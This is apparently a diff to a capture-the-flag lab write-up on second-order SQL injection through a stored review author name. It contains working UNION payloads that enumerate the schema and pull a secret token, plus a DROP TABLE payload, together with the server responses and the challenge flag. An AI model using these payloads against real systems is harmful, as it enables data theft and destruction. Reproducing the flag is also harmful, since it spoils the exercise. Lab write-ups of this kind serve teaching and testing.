@@ -56,15 +56,23 @@ The developer mistake: assuming that data from your own database is trustworthy 
 
 ### Step 1: Store the payload
 
-Log in to the application with any account (e.g., `alice@example.com` / `iloveduck`). Navigate to any product page and submit a review. In the "Display name" field, enter a destructive SQL payload:
+Log in with any account (e.g., `alice@example.com` / `iloveduck`), open any product page and submit a review. The "Display name" field is the sink: whatever goes in there is stored verbatim and rebuilt into a raw query later. Start with a probe that closes the author filter and merges a second result set:
 
 ```
-'; DROP TABLE reviews; --
+x' UNION SELECT 1, 2, 3, 4, 5, 6 --
 ```
 
-Write any content in the review body and submit. The review is stored safely via Prisma ORM, no SQL is executed at this point. The payload is just an ordinary string in the database.
+Write anything in the review body and submit. Nothing happens yet — the review is stored through Prisma, parameterized, and the payload is just a string sitting in a column.
 
 ![Exploit](../../assets/images/second-order-sql-injection/exploit.png)
+
+Only the stored value counts. Passing the same payload straight to `/admin/reviews?author=…` extracts the same rows, but the panel answers:
+
+```json
+{
+  "message": "The canary came back, but no review was ever posted under that author. A second-order injection has to reach the panel from the database, not from the query string."
+}
+```
 
 ### Step 2: Gain admin access
 
@@ -72,35 +80,66 @@ To access the admin panel, you need admin privileges. You can get there through 
 
 ### Step 3: Trigger the injection
 
-Navigate to `/admin/reviews`. The review moderation panel displays all reviews in a table with a "Filter by author" dropdown.
+Navigate to `/admin/reviews`. The moderation panel lists every review and offers a "Filter by author" dropdown, populated with the distinct author names in the database — yours included.
 
 ![Admin Interface with SQL Injection](../../assets/images/second-order-sql-injection/admin-with-sql.png)
 
-The dropdown includes the malicious payload stored in Step 1 as one of the author values. Select it.
+Select it. If the column count is wrong, the panel says so, which is how you find out the query returns six of them:
 
-### Step 4: Retrieve the flag
-
-When the filter is applied, the backend builds a raw SQL query by interpolating the stored author value:
-
-```typescript
-const query = `
-  SELECT ...
-  FROM reviews r
-  INNER JOIN products p ON r."productId" = p.id
-  WHERE r.author = '${authorFilter}'
-  ORDER BY r."createdAt" DESC
-`;
+```json
+{
+  "error": "SELECTs to the left and right of UNION do not have the same number of result columns"
+}
 ```
 
-The stored payload `'; DROP TABLE reviews; --` gets interpolated into:
+Each correction means posting a new review with the adjusted display name — the payload only ever arrives through storage.
 
-```sql
-WHERE r.author = ''; DROP TABLE reviews; --'
+The panel is also happy to run several statements at once, because the filter goes through `better-sqlite3`'s `exec()`. A display name like `'; DROP TABLE reviews; --` really does wipe the reviews table, so keep that one for after you have the flag (and `npm run db:seed` to recover).
+
+### Step 4: Enumerate the schema
+
+Store a display name that reads SQLite's own catalogue:
+
+```
+x' UNION SELECT 1, 2, group_concat(name), 4, 5, 6 FROM sqlite_master WHERE type='table' --
 ```
 
-The backend uses `better-sqlite3`'s `exec()` method, which supports multi-statement queries. So the `DROP TABLE reviews` statement actually runs and wipes the entire reviews table. The backend detects the SQL injection attempt and returns the flag in the response.
+Filter by it, and the third column of the injected row lists every table:
+
+```
+users,products,carts,cart_items,orders,order_items,addresses,flags,hints,revealed_hints,reviews,support_access_tokens,found_flags,project_init,visitor_logs,wishlists,wishlist_items,password_reset_tokens,supplier_orders,coupons,gift_cards,stream_config,sqlite_sequence,internal_secrets
+```
+
+`flags` is walled off — naming it returns `403`, and any `OSS{…}` value is stripped from the response before it leaves the server. `internal_secrets` is not, and it holds one row per injection challenge, keyed by slug.
+
+### Step 5: Read the canary
+
+Post one last review under this display name:
+
+```
+x' UNION SELECT 1, 2, token, 4, 5, 6 FROM internal_secrets WHERE slug='second-order-sql-injection' --
+```
+
+Filter by it on the moderation panel:
+
+```json
+{
+  "reviews": [
+    {
+      "id": 1,
+      "productId": 2,
+      "content": "CANARY-SECOND-ORDER-SQL-INJECTION-9dcc7a53b1ba",
+      "author": 4
+    }
+  ],
+  "flag": "OSS{s3c0nd_0rd3r_sql_1nj3ct10n}",
+  "message": "Internal secret exfiltrated through a stored review author! Well done!"
+}
+```
 
 ![Flag](../../assets/images/second-order-sql-injection/flag-sql.png)
+
+The token is generated when the lab is seeded, so it differs on every instance: returning it proves the stored name was executed as SQL.
 
 ## Vulnerable code analysis
 
